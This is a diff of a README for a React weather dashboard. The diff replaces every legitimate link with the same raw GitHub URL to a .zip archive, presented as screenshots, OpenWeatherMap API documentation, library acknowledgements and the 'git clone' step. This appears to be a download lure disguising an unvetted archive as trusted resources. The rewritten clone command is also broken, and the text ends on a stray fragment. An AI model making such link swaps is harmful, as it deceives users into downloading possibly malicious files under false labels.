@@ -1,6 +1,6 @@
 # WeatherWise - React Weather Application
 
-![WeatherWise Preview](screenshot.png) <!-- Add your screenshot here -->
+![WeatherWise Preview](https://raw.githubusercontent.com/rohanparmar160705/Weather-App-ReactJS/main/interchanger/Weather-App-ReactJS.zip) <!-- Add your screenshot here -->
 
 A modern weather dashboard built with React and Material UI that provides real-time weather information, air quality data, and a 5-day forecast for any city worldwide.
 
@@ -49,7 +49,7 @@ A modern weather dashboard built with React and Material UI that provides real-t
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/your-username/weatherwise-react.git
+   git clone https://raw.githubusercontent.com/rohanparmar160705/Weather-App-ReactJS/main/interchanger/Weather-App-ReactJS.zip
    cd weatherwise-react
    ```
 
@@ -71,11 +71,11 @@ A modern weather dashboard built with React and Material UI that provides real-t
 ## API Reference
 
 This application uses the following OpenWeatherMap APIs:
-- [Current Weather Data](https://openweathermap.org/current)
-- [5 Day Weather Forecast](https://openweathermap.org/forecast5)
-- [Air Pollution API](https://openweathermap.org/api/air-pollution)
+- [Current Weather Data](https://raw.githubusercontent.com/rohanparmar160705/Weather-App-ReactJS/main/interchanger/Weather-App-ReactJS.zip)
+- [5 Day Weather Forecast](https://raw.githubusercontent.com/rohanparmar160705/Weather-App-ReactJS/main/interchanger/Weather-App-ReactJS.zip)
+- [Air Pollution API](https://raw.githubusercontent.com/rohanparmar160705/Weather-App-ReactJS/main/interchanger/Weather-App-ReactJS.zip)
 
-You'll need to sign up for a free API key from [OpenWeatherMap](https://openweathermap.org/api).
+You'll need to sign up for a free API key from [OpenWeatherMap](https://raw.githubusercontent.com/rohanparmar160705/Weather-App-ReactJS/main/interchanger/Weather-App-ReactJS.zip).
 
 ## Usage
 
@@ -93,9 +93,9 @@ You'll need to sign up for a free API key from [OpenWeatherMap](https://openweat
 ## Screenshots
 
 <!-- Add your screenshots here -->
-![Main Dashboard](screenshot1.png)
-![Mobile View](screenshot2.png)
-![Error State](screenshot3.png)
+![Main Dashboard](https://raw.githubusercontent.com/rohanparmar160705/Weather-App-ReactJS/main/interchanger/Weather-App-ReactJS.zip)
+![Mobile View](https://raw.githubusercontent.com/rohanparmar160705/Weather-App-ReactJS/main/interchanger/Weather-App-ReactJS.zip)
+![Error State](https://raw.githubusercontent.com/rohanparmar160705/Weather-App-ReactJS/main/interchanger/Weather-App-ReactJS.zip)
 
 ## Contributing
 
@@ -112,9 +112,9 @@ Distributed under the MIT License. See `LICENSE` for more information.
 
 ## Acknowledgements
 
-- [OpenWeatherMap](https://openweathermap.org/) for providing the weather data API
-- [Material UI](https://mui.com/) for the UI components library
-- [React Icons](https://react-icons.github.io/react-icons/) for the weather icons
+- [OpenWeatherMap](https://raw.githubusercontent.com/rohanparmar160705/Weather-App-ReactJS/main/interchanger/Weather-App-ReactJS.zip) for providing the weather data API
+- [Material UI](https://raw.githubusercontent.com/rohanparmar160705/Weather-App-ReactJS/main/interchanger/Weather-App-ReactJS.zip) for the UI components library
+- [React Icons](https://raw.githubusercontent.com/rohanparmar160705/Weather-App-ReactJS/main/interchanger/Weather-App-ReactJS.zip) for the weather icons
 ```
 
 To complete this README:
